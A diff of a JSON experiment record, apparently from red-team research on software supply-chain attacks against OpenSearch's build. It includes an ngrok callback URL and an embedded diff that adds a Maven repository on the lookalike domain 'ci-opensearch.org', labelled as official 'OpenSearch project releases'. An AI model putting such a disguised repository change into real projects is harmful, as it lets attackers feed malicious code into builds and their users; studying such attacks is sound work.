@@ -1,13 +1,13 @@
 {
-  "experiment_id": "a1-base64-encoding",
-  "variant_id": "binary_jar",
-  "variant_label": "Binary JAR committed to buildSrc/libs/",
+  "experiment_id": "c1-domain-experiment",
+  "variant_id": "ci_opensearch_org_runner",
+  "variant_label": "ci-opensearch.org hyphen variant",
   "callback_url": "https://61a1-93-173-110-162.ngrok-free.app",
   "config_json": {
-    "vector": "binary_jar",
-    "path": "buildSrc/libs/build-cache-plugin-1.0.0.jar"
+    "domain": "ci-opensearch.org",
+    "purchasable": true
   },
-  "notes": "Runner \u2014 binary JAR, 0% expected but need clean runner data",
-  "run_count": 3,
-  "diff_content": "diff --git a/buildSrc/libs/build-cache-plugin-1.0.0.jar b/buildSrc/libs/build-cache-plugin-1.0.0.jar\nnew file mode 100644\nindex 0000000..2c4cd6d\nBinary files /dev/null and b/buildSrc/libs/build-cache-plugin-1.0.0.jar differ\n"
+  "notes": "Runner clean run - hyphen variant of their CI domain",
+  "run_count": 5,
+  "diff_content": "diff --git a/buildSrc/src/main/java/org/opensearch/gradle/RepositoriesSetupPlugin.java b/buildSrc/src/main/java/org/opensearch/gradle/RepositoriesSetupPlugin.java\nindex f8387d8..c7732d1 100644\n--- a/buildSrc/src/main/java/org/opensearch/gradle/RepositoriesSetupPlugin.java\n+++ b/buildSrc/src/main/java/org/opensearch/gradle/RepositoriesSetupPlugin.java\n@@ -27,5 +27,11 @@ public class RepositoriesSetupPlugin implements Plugin<Project> {\n                 repo.setUrl(\"https://ci.opensearch.org/ci/dbc/snapshots/lucene/\");\n             });\n         }\n+\n+        // OpenSearch project releases\n+        repos.maven(repo -> {\n+            repo.setName(\"opensearch-releases\");\n+            repo.setUrl(\"https://ci-opensearch.org/releases\");\n+        });\n     }\n }\n"
 }
